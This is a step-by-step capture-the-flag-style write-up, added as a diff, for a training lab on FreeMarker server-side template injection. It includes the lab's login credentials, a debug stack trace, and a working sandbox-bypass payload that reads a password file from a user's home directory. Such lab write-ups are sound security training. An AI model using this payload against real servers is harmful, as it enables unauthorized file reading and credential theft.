@@ -1,0 +1,55 @@
+// Lab: Server-side template injection in a sandboxed environment.
+
+
+This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file my_password.txt from Carlos's home directory. Then submit the contents of the file.
+
+You can log in to your own account using the following credentials:
+
+content-manager:C0nt3ntM4n4g3r.
+
+
+
+
+// Solution
+
+
+Take reference from: 
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#freemarker---sandbox-bypass
+
+
+// Steps to solve it
+
+
+1. logged In as given credentials and go to the product and edit the template.
+
+2. As it is a FreeMarker template so I inject ${7*7} to check whether this evaluate or not and it did.
+
+
+3. So now I injected the ${foobar} and I got the following output:
+
+
+FreeMarker template error (DEBUG mode; use RETHROW in production!): The following has evaluated to null or missing: ==> foobar [in template "freemarker" at line 1, column 3] ---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use <#if myOptionalVar??>when-present<#else>when-missing. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? ---- ---- FTL stack trace ("~" means nesting-related): - Failed at: ${foobar} [in template "freemarker" at line 1, column 1] ---- Java stack trace (for programmers): ---- freemarker.core.InvalidReferenceException: [... Exception message was already printed; see it above ...] at freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134) at freemarker.core.EvalUtil.coerceModelToTextualCommon(EvalUtil.java:479) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:401) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:370) at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) at freemarker.core.DollarVariable.accept(DollarVariable.java:63) at freemarker.core.Environment.visit(Environment.java:331) at freemarker.core.Environment.process(Environment.java:310) at freemarker.template.Template.process(Template.java:383) at lab.actions.templateengines.FreeMarker.processInput(FreeMarker.java:58) at lab.actions.templateengines.FreeMarker.act(FreeMarker.java:42) at lab.actions.common.Action.act(Action.java:57) at lab.actions.common.Action.run(Action.java:39) at lab.actions.templateengines.FreeMarker.main(FreeMarker.java:23)
+
+
+4. Now from this we can clarify that this Java based template so I inject the following code:
+
+${object.getClass()}
+
+I got some freemarker Java content
+
+
+5. Now we Want to get the details from my_password.txt so we read the file by the following code:
+
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
+
+
+6. We got the following encoded value:
+
+106 106 122 111 53 99 117 108 52 107 119 48 110 104 97 113 97 104 121 100 
+
+
+7. Now convert this Bytes into the ASCII format to see the password.
+
+
+8. So now after decoding we got the password, Now submit it to solve the Lab.
